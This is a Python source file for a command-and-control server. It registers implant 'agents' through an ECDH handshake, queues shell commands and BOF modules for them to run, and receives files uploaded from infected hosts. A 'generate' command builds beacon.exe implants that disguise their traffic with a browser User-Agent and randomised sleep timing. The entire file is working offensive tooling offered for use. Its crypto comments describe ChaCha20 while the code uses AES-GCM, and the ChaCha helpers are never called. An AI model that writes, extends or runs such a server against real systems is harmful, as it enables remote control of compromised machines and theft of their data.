import os, re, sys, json, uuid, threading, logging, struct, hashlib, argparse, shlex, subprocess
from datetime import datetime
from flask import Flask, request

from cryptography.hazmat.primitives.asymmetric.ec import (
    ECDH, generate_private_key, SECP256R1, EllipticCurvePublicKey
)
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.exceptions import InvalidTag

# ---------------------------------------------------------------------------
# Server config — set entirely from CLI args at startup
# ---------------------------------------------------------------------------
_arg_parser = argparse.ArgumentParser(
    prog="c2server",
    description="C2 Server",
    formatter_class=argparse.RawTextHelpFormatter,
)
_arg_parser.add_argument("--ip",     default="0.0.0.0",       metavar="ADDR",  help="bind address          (default: 0.0.0.0)")
_arg_parser.add_argument("--port",   default=8080, type=int,   metavar="PORT",  help="listen port           (default: 8080)")
_arg_parser.add_argument("--token",  default="",               metavar="TOKEN", help="registration auth token (default: none)")
_arg_parser.add_argument("--https",  action="store_true",                       help="enable HTTPS (requires --cert and --key)")
_arg_parser.add_argument("--cert",   default="",               metavar="FILE",  help="TLS certificate file")
_arg_parser.add_argument("--key",    default="",               metavar="FILE",  help="TLS key file")
SERVER_ARGS = _arg_parser.parse_args()

LISTEN_IP   = SERVER_ARGS.ip
LISTEN_PORT = SERVER_ARGS.port
AUTH_TOKEN  = SERVER_ARGS.token
USE_HTTPS   = SERVER_ARGS.https
SSL_CONTEXT = (SERVER_ARGS.cert, SERVER_ARGS.key) if (USE_HTTPS and SERVER_ARGS.cert and SERVER_ARGS.key) else None

# ---------------------------------------------------------------------------
# Flask app
# ---------------------------------------------------------------------------
app = Flask(__name__)
logging.getLogger("werkzeug").setLevel(logging.ERROR)

agents        = {}
command_queue = {}
BOF_DIR       = "bofs"
UPLOAD_DIR    = "uploads"
STATE_FILE    = "agents.json"
AUTH_HEADER   = "X-C2-Token"

_print_lock     = threading.Lock()
_current_prompt = ""

# ---------------------------------------------------------------------------
# ChaCha20-Poly1305 — simple scheme matching the C agent.
#
# Wire format: nonce(12) || ciphertext(N) || tag(16)
# Tag covers ciphertext only (no AAD, no length block).
#
# Python's ChaCha20Poly1305 class follows RFC 8439 and appends a length block
# to the Poly1305 input — the C agent does not, so we can't use that class here.
# ---------------------------------------------------------------------------

def _rotl32(v: int, n: int) -> int:
    return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF

def _chacha20_block(key: bytes, nonce: bytes, counter: int) -> bytes:
    sigma = b"expand 32-byte k"
    s = [struct.unpack_from("<I", sigma, i * 4)[0] for i in range(4)]
    s += [struct.unpack_from("<I", key,   i * 4)[0] for i in range(8)]
    s += [counter]
    s += [struct.unpack_from("<I", nonce, i * 4)[0] for i in range(3)]
    orig = s[:]
    for _ in range(10):
        for a, b, c, d in [(0,4,8,12),(1,5,9,13),(2,6,10,14),(3,7,11,15),
                           (0,5,10,15),(1,6,11,12),(2,7,8,13),(3,4,9,14)]:
            s[a]=(s[a]+s[b])&0xFFFFFFFF; s[d]^=s[a]; s[d]=_rotl32(s[d],16)
            s[c]=(s[c]+s[d])&0xFFFFFFFF; s[b]^=s[c]; s[b]=_rotl32(s[b],12)
            s[a]=(s[a]+s[b])&0xFFFFFFFF; s[d]^=s[a]; s[d]=_rotl32(s[d], 8)
            s[c]=(s[c]+s[d])&0xFFFFFFFF; s[b]^=s[c]; s[b]=_rotl32(s[b], 7)
    return struct.pack("<16I", *[(s[i] + orig[i]) & 0xFFFFFFFF for i in range(16)])

def _chacha20_xor(data: bytes, key: bytes, nonce: bytes, counter: int) -> bytes:
    out = bytearray(len(data))
    pos, ctr = 0, counter
    while pos < len(data):
        block = _chacha20_block(key, nonce, ctr); ctr += 1
        chunk = min(64, len(data) - pos)
        for i in range(chunk):
            out[pos + i] = data[pos + i] ^ block[i]
        pos += chunk
    return bytes(out)

def _poly1305_mac(otk: bytes, msg: bytes) -> bytes:
    rb = bytearray(otk[:16])
    rb[3]&=15; rb[7]&=15; rb[11]&=15; rb[15]&=15
    rb[4]&=252; rb[8]&=252; rb[12]&=252
    r = int.from_bytes(rb, "little")
    s = int.from_bytes(otk[16:32], "little")
    p = (1 << 130) - 5
    h = 0
    for i in range(0, len(msg), 16):
        block = msg[i:i + 16]
        n = int.from_bytes(block, "little") + (1 << (8 * len(block)))
        h = ((h + n) * r) % p
    return ((h + s) & ((1 << 128) - 1)).to_bytes(16, "little")

def encrypt_response(key: bytes, plaintext: bytes) -> bytes:
    nonce  = os.urandom(12)
    ct_tag = AESGCM(key).encrypt(nonce, plaintext, associated_data=None)
    return nonce + ct_tag
 
 
def decrypt_request(key: bytes, data: bytes) -> bytes:
    if len(data) < 28:            # 12 nonce + 0 ct + 16 tag minimum
        return b""
    nonce, ct_tag = data[:12], data[12:]
    try:
        return AESGCM(key).decrypt(nonce, ct_tag, associated_data=None)
    except InvalidTag:
        return b""

# ---------------------------------------------------------------------------
# ECDH key exchange
# ---------------------------------------------------------------------------

def ecdh_derive_session_key(our_priv, peer_pub_bytes: bytes) -> bytes:
    peer_pub = EllipticCurvePublicKey.from_encoded_point(SECP256R1(), peer_pub_bytes)
    shared   = our_priv.exchange(ECDH(), peer_pub)
    return hashlib.sha256(shared).digest()

# ---------------------------------------------------------------------------
# Terminal primitives
# ---------------------------------------------------------------------------
W  = 72
HR = "─" * W
HL = "━" * W

RESET  = "\033[0m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RED    = "\033[38;5;196m"
GREEN  = "\033[38;5;82m"
YELLOW = "\033[38;5;220m"
CYAN   = "\033[38;5;117m"
GREY   = "\033[38;5;244m"
WHITE  = "\033[38;5;255m"

def _no_color():
    return not sys.stdout.isatty() or os.environ.get("NO_COLOR")

def c(text, color):
    return text if _no_color() else f"{color}{text}{RESET}"

def ts():
    return datetime.now().strftime("%H:%M:%S")

_TAGS = {
    "ok"  : lambda: c("  OK  ", GREEN),
    "err" : lambda: c(" ERR  ", RED),
    "send": lambda: c(" SEND ", CYAN),
    "recv": lambda: c(" RECV ", CYAN),
    "up"  : lambda: c("  UP  ", YELLOW),
    "down": lambda: c(" DOWN ", YELLOW),
    "info": lambda: c(" INFO ", GREY),
    "warn": lambda: c(" WARN ", YELLOW),
    "build": lambda: c("BUILD ", CYAN),
}

def _reprint_prompt():
    if _current_prompt:
        sys.stdout.write(_current_prompt)
        sys.stdout.flush()

def log(msg, level="info"):
    tag = _TAGS.get(level, _TAGS["info"])()
    with _print_lock:
        print(f" {c(ts(), GREY)} {tag}  {msg}")

def async_log(msg, level="info"):
    tag = _TAGS.get(level, _TAGS["info"])()
    with _print_lock:
        sys.stdout.write("\r\033[2K")
        print(f" {c(ts(), GREY)} {tag}  {msg}")
        _reprint_prompt()

def async_output(lines):
    with _print_lock:
        sys.stdout.write("\r\033[2K")
        for line in lines:
            print(line)
        _reprint_prompt()

def header(title, sub=None):
    print(f"\n{c(HL, DIM)}")
    print(f"  {c(title, BOLD + WHITE)}")
    if sub:
        print(f"  {c(sub, GREY)}")
    print(c(HR, DIM))

def row(k, v, w=24):
    print(f"  {c(k.ljust(w), GREY)}{v}")

def _visible_len(s):
    return len(re.sub(r'\033\[[0-9;]*m', '', str(s)))

def _pad(s, width):
    s = str(s)
    return s + (" " * max(width - _visible_len(s), 0))

def table_header(*cols):
    widths, labels = zip(*cols)
    line = "  " + "".join(l.ljust(w) for l, w in zip(labels, widths))
    print(c(line, DIM))
    print(c("  " + HR, DIM))

def table_row(*cols):
    widths, values = zip(*cols)
    print("  " + "".join(_pad(v, w) for v, w in zip(values, widths)))

def section_end():
    print(c(HR, DIM) + "\n")

def fmt_bytes(n):
    for u in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.1f} {u}"
        n /= 1024
    return f"{n:.1f} TB"

def fmt_age(dt):
    s = (datetime.now() - dt).total_seconds()
    if s < 60:   return f"{int(s)}s ago"
    if s < 3600: return f"{int(s/60)}m ago"
    return f"{int(s/3600)}h ago"

def agent_status(dt):
    s = (datetime.now() - dt).total_seconds()
    if s < 15:  return c("LIVE", GREEN)
    if s < 120: return c("IDLE", YELLOW)
    return c("DEAD", RED)

# ---------------------------------------------------------------------------
# State persistence
# ---------------------------------------------------------------------------

def save_state():
    try:
        with open(STATE_FILE, "w") as f:
            json.dump(
                {
                    aid: {
                        "key":            a["key"].hex(),
                        "last_seen":      a["last_seen"].isoformat(),
                        "registered":     a["registered"].isoformat(),
                        "output_history": [
                            {
                                "timestamp": entry["timestamp"].isoformat(),
                                "output":    entry["output"],
                            }
                            for entry in a["output_history"]
                        ],
                        "last_output":    a["last_output"],
                        "command_count":  a["command_count"],
                        "bytes_sent":     a["bytes_sent"],
                        "bytes_received": a["bytes_received"],
                    }
                    for aid, a in agents.items()
                },
                f, indent=2
            )
    except Exception as e:
        async_log(f"State save failed: {e}", "err")


def load_state():
    if not os.path.exists(STATE_FILE):
        return
    try:
        with open(STATE_FILE, "r") as f:
            data = json.load(f)
        for aid, state in data.items():
            try:
                agents[aid] = {
                    "key":            bytes.fromhex(state["key"]),
                    "last_seen":      datetime.fromisoformat(state["last_seen"]),
                    "registered":     datetime.fromisoformat(state["registered"]),
                    "output_history": [
                        {
                            "timestamp": datetime.fromisoformat(entry["timestamp"]),
                            "output":    entry["output"],
                        }
                        for entry in state.get("output_history", [])
                    ],
                    "last_output":    state.get("last_output", ""),
                    "command_count":  state.get("command_count", 0),
                    "bytes_sent":     state.get("bytes_sent", 0),
                    "bytes_received": state.get("bytes_received", 0),
                }
                command_queue[aid] = None
            except Exception as e:
                async_log(f"Failed to restore agent {aid[:8]}: {e}", "warn")
        if agents:
            async_log(f"Restored {len(agents)} agent(s) from {STATE_FILE}", "ok")
    except Exception as e:
        async_log(f"Failed to load state: {e}", "err")


def new_agent(key: bytes) -> dict:
    return {
        "key":            key,
        "last_seen":      datetime.now(),
        "registered":     datetime.now(),
        "output_history": [],
        "last_output":    "",
        "command_count":  0,
        "bytes_sent":     0,
        "bytes_received": 0,
    }

# ---------------------------------------------------------------------------
# Flask routes
# ---------------------------------------------------------------------------

@app.route("/register", methods=["POST"])
def route_register():
    beacon_pub_bytes = request.data

    if AUTH_TOKEN:
        token = request.headers.get(AUTH_HEADER, "")
        if token != AUTH_TOKEN:
            async_log(f"Bad /register auth from {request.remote_addr}", "warn")
            return b"forbidden", 403

    if len(beacon_pub_bytes) != 65 or beacon_pub_bytes[0] != 0x04:
        async_log("Bad /register — expected 65-byte X9.62 pubkey", "err")
        return b"bad request", 400

    try:
        server_priv      = generate_private_key(SECP256R1())
        server_pub_bytes = server_priv.public_key().public_bytes(
            Encoding.X962, PublicFormat.UncompressedPoint
        )
        session_key = ecdh_derive_session_key(server_priv, beacon_pub_bytes)
    except Exception as e:
        async_log(f"ECDH failed: {e}", "err")
        return b"error", 500

    aid                = str(uuid.uuid4())
    agents[aid]        = new_agent(session_key)
    command_queue[aid] = None

    async_log(
        f"Agent registered  id={c(aid[:8], CYAN)}  "
        f"key={c(session_key.hex(), DIM)}",
        "ok"
    )
    save_state()
    return server_pub_bytes + aid.encode(), 200, {"Content-Type": "application/octet-stream"}


@app.route("/checkin/<aid>", methods=["POST"])
def route_checkin(aid):
    if aid not in agents:
        return b"unknown", 404

    a   = agents[aid]
    key = a["key"]
    a["last_seen"] = datetime.now()

    plain = decrypt_request(key, request.data)
    raw   = plain.decode("utf-8", errors="ignore").strip()

    if raw:
        a["bytes_received"] += len(request.data)
        a["output_history"].append({"timestamp": datetime.now(), "output": raw})
        a["last_output"] = raw

        lines = [
            f"\n{c(HL, DIM)}",
            f"  {c('OUTPUT', BOLD + WHITE)}  {c(aid[:8], CYAN)}  {c(ts(), GREY)}",
            c(HR, DIM),
        ]
        for line in raw.splitlines():
            lines.append(f"  {line}")
        lines.append(c(HR, DIM))
        async_output(lines)

    cmd = command_queue.get(aid)
    if cmd:
        command_queue[aid]  = None
        a["command_count"] += 1
        a["bytes_sent"]    += len(cmd)
        preview = cmd[:55] + ("..." if len(cmd) > 55 else "")
        async_log(f"Dispatch  {c(aid[:8], CYAN)}  {c(preview, DIM)}", "send")
        response = encrypt_response(key, cmd.encode())
        if cmd == "KILL":
            # Remove agent from state after dispatching — it won't check in again
            agents.pop(aid, None)
            command_queue.pop(aid, None)
            save_state()
            async_log(f"Agent removed  {c(aid[:8], CYAN)}", "ok")
        return response, 200, {"Content-Type": "application/octet-stream"}

    return encrypt_response(key, b""), 200


@app.route("/getbof/<aid>/<name>", methods=["POST"])
def route_getbof(aid, name):
    if aid not in agents:
        return b"unknown", 404

    key  = agents[aid]["key"]
    base = os.path.basename(name)
    for suffix in (".obj", ".o"):
        if base.endswith(suffix):
            base = base[:-len(suffix)]
            break
    path = os.path.join(BOF_DIR, base + ".obj")

    if not os.path.exists(path):
        async_log(f"BOF not found: {base}", "err")
        return encrypt_response(key, b"not found"), 404

    with open(path, "rb") as f:
        data = f.read()

    agents[aid]["bytes_sent"] += len(data)
    async_log(f"BOF served  {c(base, CYAN)}  {fmt_bytes(len(data))}  to {c(aid[:8], CYAN)}", "down")
    return encrypt_response(key, data), 200, {"Content-Type": "application/octet-stream"}


@app.route("/upload/<aid>/<filename>", methods=["POST"])
def route_upload(aid, filename):
    if aid not in agents:
        return b"unknown", 404

    key   = agents[aid]["key"]
    plain = decrypt_request(key, request.data)
    dest  = os.path.join(UPLOAD_DIR, aid[:8])
    os.makedirs(dest, exist_ok=True)
    with open(os.path.join(dest, filename), "wb") as f:
        f.write(plain)

    agents[aid]["bytes_received"] += len(request.data)
    async_log(f"Upload  {c(filename, CYAN)}  {fmt_bytes(len(plain))}  from {c(aid[:8], CYAN)}", "up")
    return encrypt_response(key, b"OK"), 200

# ---------------------------------------------------------------------------
# BOF argument packing
# ---------------------------------------------------------------------------
try:
    from beacon_generate import BeaconPack
except ImportError:
    sys.exit("FATAL  beacon_generate.py not found")

# ---------------------------------------------------------------------------
# CLI commands
# ---------------------------------------------------------------------------

def cmd_list():
    header("AGENTS")
    if not agents:
        print(f"  {c('no agents registered', GREY)}\n")
        return
    table_header(
        (10, "ID"),
        (8,  "STATUS"),
        (14, "LAST SEEN"),
        (8,  "CMDS"),
        (12, "SENT"),
        (12, "RECV"),
    )
    for aid, a in agents.items():
        table_row(
            (10, c(aid[:8], CYAN)),
            (8,  agent_status(a["last_seen"])),
            (14, fmt_age(a["last_seen"])),
            (8,  str(a["command_count"])),
            (12, fmt_bytes(a["bytes_sent"])),
            (12, fmt_bytes(a["bytes_received"])),
        )
    section_end()


def cmd_bofs():
    header("BOF MODULES", sub=os.path.abspath(BOF_DIR))
    if not os.path.isdir(BOF_DIR):
        os.makedirs(BOF_DIR, exist_ok=True)
        print(f"  {c('directory created — drop .obj files here', GREY)}\n")
        return
    files = [f for f in os.listdir(BOF_DIR) if f.endswith((".obj", ".o"))]
    if not files:
        print(f"  {c('no modules found', GREY)}\n")
        return
    table_header((32, "NAME"), (12, "SIZE"), (10, "FORMAT"))
    for f in sorted(files):
        ext  = ".obj" if f.endswith(".obj") else ".o"
        base = f[:-len(ext)]
        size = os.path.getsize(os.path.join(BOF_DIR, f))
        table_row((32, c(base, WHITE)), (12, fmt_bytes(size)), (10, c(ext, GREY)))
    print(f"\n  {c(str(len(files)) + ' module(s)', GREY)}")
    section_end()


def cmd_info(aid):
    a = agents[aid]
    header("AGENT INFO", sub=aid)
    row("ID",             c(aid, CYAN))
    row("Short ID",       c(aid[:8], CYAN))
    row("Status",         agent_status(a["last_seen"]))
    row("Session key",    c(a["key"].hex(), DIM))
    row("Registered",     a["registered"].strftime("%Y-%m-%d %H:%M:%S"))
    row("Last seen",      a["last_seen"].strftime("%H:%M:%S") + f"  ({fmt_age(a['last_seen'])})")
    print()
    row("Commands",       str(a["command_count"]))
    row("Output entries", str(len(a["output_history"])))
    row("Bytes sent",     fmt_bytes(a["bytes_sent"]))
    row("Bytes received", fmt_bytes(a["bytes_received"]))
    if a["last_output"]:
        print(f"\n  {c('last output preview', GREY)}")
        print(c("  " + HR, DIM))
        for line in a["last_output"][:400].splitlines():
            print(f"  {line}")
    section_end()


def cmd_stats(aid):
    a      = agents[aid]
    uptime = (datetime.now() - a["registered"]).total_seconds()
    header("STATISTICS", sub=aid[:8])
    row("Uptime",    f"{int(uptime)}s  ({int(uptime/60)}m)")
    row("Commands",  str(a["command_count"]))
    row("Outputs",   str(len(a["output_history"])))
    row("Sent",      fmt_bytes(a["bytes_sent"]))
    row("Received",  fmt_bytes(a["bytes_received"]))
    if a["command_count"]:
        row("Avg / cmd", fmt_bytes(a["bytes_sent"] / a["command_count"]))
    section_end()


def cmd_output(aid, n=10):
    hist = agents[aid]["output_history"]
    if not hist:
        print(f"  {c('no output recorded', GREY)}\n")
        return
    entries = hist[-n:]
    header("OUTPUT HISTORY", sub=f"showing {len(entries)} of {len(hist)}")
    for entry in entries:
        print(f"  {c(entry['timestamp'].strftime('%H:%M:%S'), GREY)}")
        print(c("  " + HR, DIM))
        for line in entry["output"].splitlines():
            print(f"  {line}")
        print()
    section_end()


def cmd_generate(args_str):
    """
    Build a beacon binary from the console without touching any config file.

    Usage:
      generate [--ip ADDR] [--port PORT] [--ua STRING] [--token STRING]
               [--sleep MS] [--jitter MS] [--https] [--out NAME]

    All flags are optional; defaults match the server's own startup values.
    The server address and port default to whatever this server is listening on,
    so a plain `generate` with no flags just works for a local test.
    """
    gen = argparse.ArgumentParser(prog="generate", add_help=False, exit_on_error=False)
    gen.add_argument("--ip",     default=LISTEN_IP  if LISTEN_IP != "0.0.0.0" else "127.0.0.1")
    gen.add_argument("--port",   default=str(LISTEN_PORT))
    gen.add_argument("--ua",     default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    gen.add_argument("--token",  default=AUTH_TOKEN)
    gen.add_argument("--sleep",  default="5000")
    gen.add_argument("--jitter", default="3000")
    gen.add_argument("--https",  action="store_true")
    gen.add_argument("--out",    default="beacon.exe")

    try:
        gargs = gen.parse_args(shlex.split(args_str) if args_str else [])
    except (argparse.ArgumentError, SystemExit):
        log("usage: generate [--ip X] [--port X] [--ua X] [--token X] [--sleep X] [--jitter X] [--https] [--out X]", "err")
        return

    # Locate build.bat relative to this script
    script_dir = os.path.dirname(os.path.abspath(__file__))
    bat        = os.path.join(script_dir, "..", "agent", "build.bat")
    bat        = os.path.normpath(bat)

    if not os.path.exists(bat):
        log(f"build.bat not found at {bat}", "err")
        return

    https_flag = "1" if gargs.https else "0"

    call = [bat, gargs.ip, gargs.port, gargs.ua, gargs.token,
            gargs.sleep, gargs.jitter, https_flag, gargs.out]

    log(
        f"Building  {c(gargs.out, CYAN)}  "
        f"ip={c(gargs.ip, WHITE)}  port={c(gargs.port, WHITE)}  "
        f"https={c(str(gargs.https), WHITE)}",
        "build"
    )

    agent_dir  = os.path.normpath(os.path.join(script_dir, "..", "agent"))
    build_dir  = os.path.join(agent_dir, "build")
    final_out  = gargs.out                              # e.g. beacon.exe
    tmp_out    = "_tmp_" + final_out                    # build to this first

    # Build to a temp filename so the linker never touches the live binary.
    # Once the build succeeds, atomically replace the real file.
    if os.name == "nt":
        invoke = ["cmd", "/c", bat, gargs.ip, gargs.port, gargs.ua,
                  gargs.token, gargs.sleep, gargs.jitter, https_flag, tmp_out]
    else:
        invoke = [bat, gargs.ip, gargs.port, gargs.ua,
                  gargs.token, gargs.sleep, gargs.jitter, https_flag, tmp_out]

    try:
        result = subprocess.run(
            invoke,
            capture_output=True,
            text=True,
            cwd=agent_dir,
        )
    except Exception as e:
        log(f"Failed to invoke build.bat: {e}", "err")
        return

    if result.returncode == 0:
        # Rename temp -> final (overwrites on Windows too via os.replace)
        tmp_path   = os.path.join(build_dir, tmp_out)
        final_path = os.path.join(build_dir, final_out)
        try:
            os.replace(tmp_path, final_path)
            log(f"Built  {c(final_path, CYAN)}", "ok")
        except OSError as e:
            log(f"Build succeeded but rename failed: {e}", "err")
            log(f"Binary is at {c(tmp_path, CYAN)}", "info")
    else:
        log("Build failed", "err")
        output = (result.stdout + result.stderr).strip()
        if output:
            print(c("  " + HR, DIM))
            for line in output[-800:].splitlines():
                print(f"  {c(line, GREY)}")
            print(c("  " + HR, DIM))

def cmd_help():
    header("COMMAND REFERENCE")
    sections = [
        ("GLOBAL", [
            ("list",                      "list all agents"),
            ("bofs",                      "list available BOF modules"),
            ("generate [flags]",          "build a beacon binary (see below)"),
            ("use <id>",                  "select agent by full or partial ID"),
            ("clear",                     "clear the terminal"),
            ("help",                      "show this reference"),
            ("exit",                      "shutdown server"),
        ]),
        ("AGENT  (requires: use <id>)", [
            ("shell <cmd>",               "execute shell command"),
            ("bof <name> [args]",         "execute BOF module"),
            ("output [n]",                "show last N outputs  (default 10)"),
            ("info",                      "agent details + session key"),
            ("stats",                     "session statistics"),
            ("kill",                      "terminate the agent process and remove it"),
            ("back",                      "deselect agent"),
        ]),
        ("GENERATE FLAGS  (all optional)", [
            ("--ip ADDR",                 f"C2 server IP the beacon calls home to  (default: server listen IP)"),
            ("--port PORT",               f"C2 server port                          (default: {LISTEN_PORT})"),
            ("--ua STRING",               "HTTP User-Agent string"),
            ("--token STRING",            "registration auth token"),
            ("--sleep MS",                "beacon check-in interval in ms          (default: 5000)"),
            ("--jitter MS",               "sleep jitter in ms                      (default: 3000)"),
            ("--https",                   "enable HTTPS in the beacon"),
            ("--out NAME",                "output filename                         (default: beacon.exe)"),
        ]),
        ("BOF ARGUMENT TYPES", [
            ("s:<value>",                 "UTF-8 string"),
            ("w:<value>",                 "UTF-16LE wide string"),
            ("i:<value>",                 "32-bit integer"),
            ("h:<value>",                 "16-bit short"),
            ("<value>",                   "no prefix defaults to string"),
        ]),
    ]
    for title, entries in sections:
        print(f"  {c(title, BOLD + WHITE)}")
        for cmd_str, desc in entries:
            print(f"  {c(cmd_str.ljust(32), CYAN)}{c(desc, GREY)}")
        print()
    section_end()


def send_cmd(aid, cmd):
    command_queue[aid] = cmd
    log(f"Queued  agent={c(aid[:8], CYAN)}", "info")


def send_bof(aid, name, args_str=""):
    bp = BeaconPack()
    for token in (args_str or "").split():
        if ":" in token:
            t, v = token.split(":", 1)
            if   t == "s": bp.addstr(v)
            elif t == "w": bp.addWstr(v)
            elif t == "i": bp.addint(int(v))
            elif t == "h": bp.addshort(int(v))
            else:
                log(f"Unknown arg type '{t}'  valid: s / w / i / h", "err")
                return
        else:
            bp.addstr(token)
    send_cmd(aid, f"BOF:{name}:{bp.getbuffer().hex()}")


def resolve_agent(partial):
    matches = [a for a in agents if a.startswith(partial)]
    if not matches:
        return None, f"no agent matched: {partial}"
    if len(matches) > 1:
        return None, f"ambiguous ID  matches={[m[:8] for m in matches]}"
    return matches[0], None


def interactive_shell():
    global _current_prompt
    current = None

    while True:
        try:
            prompt = (
                f" {c(current[:8], CYAN)} {c('>', GREY)} "
                if current else f" {c('>', GREY)} "
            )
            with _print_lock:
                _current_prompt = prompt
                sys.stdout.write(prompt)
                sys.stdout.flush()

            line = sys.stdin.readline()
            if not line:
                break
            line = line.strip()
            if not line:
                continue

            parts = line.split(maxsplit=1)
            cmd   = parts[0].lower()
            args  = parts[1] if len(parts) > 1 else ""

            if cmd == "exit":
                print(f"\n  {c('shutting down', GREY)}\n")
                save_state()
                break
            elif cmd == "clear":
                os.system("cls" if os.name == "nt" else "clear")
            elif cmd == "list":
                cmd_list()
            elif cmd == "bofs":
                cmd_bofs()
            elif cmd == "generate":
                cmd_generate(args)
            elif cmd == "help":
                cmd_help()
            elif cmd == "use":
                if not args:
                    log("usage: use <agent_id>", "err")
                    continue
                aid, err = resolve_agent(args)
                if err:
                    log(err, "err")
                else:
                    current = aid
                    log(f"selected {c(aid[:8], CYAN)}", "ok")
            elif cmd == "back":
                if current:
                    log(f"deselected {c(current[:8], CYAN)}", "ok")
                    current = None
                else:
                    log("no agent selected", "warn")
            elif cmd in ("shell", "bof", "output", "info", "stats", "kill"):
                if not current:
                    log("no agent selected  (use: use <id>)", "err")
                    continue
                if cmd == "shell":
                    if not args:
                        log("usage: shell <command>", "err")
                    else:
                        send_cmd(current, args)
                elif cmd == "bof":
                    if not args:
                        log("usage: bof <name> [type:arg ...]", "err")
                    else:
                        bof_parts = args.split(maxsplit=1)
                        send_bof(current, bof_parts[0],
                                 bof_parts[1] if len(bof_parts) > 1 else "")
                elif cmd == "output":
                    n = int(args) if args.isdigit() else 10
                    cmd_output(current, n)
                elif cmd == "info":
                    cmd_info(current)
                elif cmd == "stats":
                    cmd_stats(current)
                elif cmd == "kill":
                    command_queue[current] = "KILL"
                    log(f"Kill queued for {c(current[:8], CYAN)}  (takes effect on next checkin)", "warn")
                    current = None   # deselect so prompt doesn't show a dead agent
            else:
                log(f"unknown command: {cmd}  (type help)", "err")

        except KeyboardInterrupt:
            print()
            log("interrupted  (exit to quit, back to deselect)", "warn")
            current = None
        except Exception as e:
            log(str(e), "err")
            import traceback; traceback.print_exc()


def banner():
    proto = "https" if USE_HTTPS else "http"
    print(f"\n{c(HL, DIM)}")
    print(f"  {c('C2 SERVER', BOLD + WHITE)}")
    print(f"  {c(f'{proto}://{LISTEN_IP}:{LISTEN_PORT}', GREY)}")
    print(f"{c(HL, DIM)}\n")


if __name__ == "__main__":
    os.makedirs(BOF_DIR,    exist_ok=True)
    os.makedirs(UPLOAD_DIR, exist_ok=True)

    load_state()
    banner()

    if AUTH_TOKEN:
        log(f"register auth enabled  header={AUTH_HEADER}", "warn")
    if USE_HTTPS:
        if SSL_CONTEXT:
            log(f"HTTPS enabled  cert={SERVER_ARGS.cert}", "warn")
        else:
            log("--https requires --cert and --key  (generate with: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj /CN=127.0.0.1)", "err")
            sys.exit(1)

    def _flask():
        app.run(
            host=LISTEN_IP, port=LISTEN_PORT,
            debug=False, use_reloader=False, threaded=True,
            ssl_context=SSL_CONTEXT if USE_HTTPS else None,
        )

    threading.Thread(target=_flask, daemon=True).start()

    log(f"listening    {LISTEN_IP}:{LISTEN_PORT}", "ok")
    log(f"bof dir      {os.path.abspath(BOF_DIR)}", "ok")
    log(f"upload dir   {os.path.abspath(UPLOAD_DIR)}", "ok")
    print()

    try:
        interactive_shell()
    except KeyboardInterrupt:
        print()
    finally:
        save_state()
        log("stopped", "ok")
        print()